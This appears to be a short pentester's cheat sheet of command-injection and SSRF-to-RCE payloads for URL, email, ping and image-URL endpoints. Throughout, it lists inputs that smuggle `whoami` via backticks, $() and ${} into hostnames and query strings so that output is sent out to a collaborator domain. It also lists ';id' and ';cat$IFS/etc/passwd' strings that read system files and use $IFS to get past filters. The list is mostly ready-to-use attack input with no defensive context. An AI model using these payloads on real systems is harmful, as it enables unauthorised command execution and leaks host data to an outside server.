```
test with these payloads on url endpoint
https://`whoami`.{collabrator-domain}
https://$(whoami).{collabrator-domain}
https://${13+37}.{collabrator-domain}
https://{collabrator-domain}/?`whoami`
https://{collabrator-domain}/?$(whoami)
https://{collabrator-domain}/?${13+37}

for this simple(without payload) 1st req url is:
https://{collabrator-domain}


test with these payloads on email endpoint

test@.`whoami`.{collabrator-domain}
test@.$(whoami).{collabrator-domain}
test@.${13+37}.{collabrator-domain}

for this simple(without payload) 1st req url is:
test@.{collabrator-domain}


test with these payloads on ping fuction endpoint

`whoami`.{collabrator-domain}
$(whoami).{collabrator-domain}
${13+37}.{collabrator-domain}

for this simple(without payload) 1st req url is:
{collabrator-domain}
```


### ssrf to rce

```
https://{domain}/?`whoami`
https://{domain}/?$(whoami)
https://{domain}/?${whoami}
https://`whoami`.{domain}
https://$(whoami).{domain}
https://${whoami}.{domain}
https://{domain}?;id
https://{domain};id;
https://{domain};cat$IFS/etc/passwd;
https://{domain}?;id;
https://{domain}?;cat$IFS/etc/passwd;
```

### on image-url endpoint
```
?`whoami`
?${whoami}
?$(whoami)
?;id
?;id;
?;cat$IFS/etc/passwd;
```
